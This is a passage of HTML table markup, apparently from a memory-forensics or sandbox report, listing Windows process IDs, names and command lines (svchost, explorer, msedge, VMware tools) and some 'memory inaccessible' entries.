style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xdb21702020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:989px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>3216</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>sihost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>sihost.exe</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1012px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>3252</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k UnistackSvcGroup</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1035px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>3316</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>taskhostw.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>taskhostw.exe &#x7b;222A245B-E637-4AE9-A93F-A59CA119A75E&#x7d;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1058px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>3504</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>ctfmon.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>ctfmon.exe</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1081px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>3616</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>userinit.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xca66d46020 is not valid &#x28;process exited&#x3f;&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1104px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>3656</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>explorer.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;Explorer.EXE</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1127px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>3148</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k ClipboardSvcGroup -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1150px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>4356</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>StartMenuExper</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;SystemApps&#x5c;Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy&#x5c;StartMenuExperienceHost.exe -ServerName&#x3a;App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1173px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>4500</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>RuntimeBroker.</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xa02e95020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1196px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>4696</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SearchApp.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:4;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'></div><div class='cover' style='z-index:4; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1219px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>4796</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>RuntimeBroker.</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;System32&#x5c;RuntimeBroker.exe -Embedding</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1242px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>5180</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>RuntimeBroker.</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x20582803378 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1265px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>5488</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Program Files &#x28;x86&#x29;&#x5c;Microsoft&#x5c;Edge&#x5c;Application&#x5c;msedge.exe </div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1288px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>5540</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xdb132ba020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1311px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>5760</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x70eb844020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1334px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>5768</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x19ac9a04000 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1357px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>5780</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Program Files &#x28;x86&#x29;&#x5c;Microsoft&#x5c;Edge&#x5c;Application&#x5c;msedge.exe --type&#x3d;utility --utility-sub-type&#x3d;network.mojom.NetworkService --lang&#x3d;en-US --service-sandbox-type&#x3d;none --field-trial-handle&#x3d;1928,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle&#x3d;2684 &#x2f;prefetch&#x3a;3</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1380px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>5792</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x22837c039b8 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1403px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>5848</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SecurityHealth</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;System32&#x5c;SecurityHealthSystray.exe </div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1426px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6268</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SecurityHealth</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;SecurityHealthService.exe</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1449px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6368</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>vmtoolsd.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Program Files&#x5c;VMware&#x5c;VMware Tools&#x5c;vmtoolsd.exe -n vmusr</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1472px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6604</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>TextInputHost.</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;SystemApps&#x5c;MicrosoftWindows.Client.CBS_cw5n1h2txyewy&#x5c;TextInputHost.exe -ServerName&#x3a;InputApp.AppXjd5de1g66v206tj52m9d0dtpppx4cgpn.mca</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1495px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>7540</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x6aac0cc020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1518px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>7176</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SkypeApp.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xbc52ca8020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1541px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>5088</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Program Files &#x28;x86&#x29;&#x5c;Microsoft&#x5c;Edge&#x5c;Application&#x5c;msedge.exe --type&#x3d;utility --utility-sub-type&#x3d;edge_search_indexer.mojom.SearchIndexerInterfaceBroker --lang&#x3d;en-US --service-sandbox-type&#x3d;search_indexer --message-loop-type-ui --field-trial-handle&#x3d;7556,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle&#x3d;7548 &#x2f;prefetch&#x3a;8</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1564px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>7848</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>RuntimeBroker.</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x7fff036020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1587px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>7792</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k LocalService -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1610px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>7336</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>RuntimeBroker.</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x2b16af4020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1633px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6780</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>WWAHost.exe</div></div><div 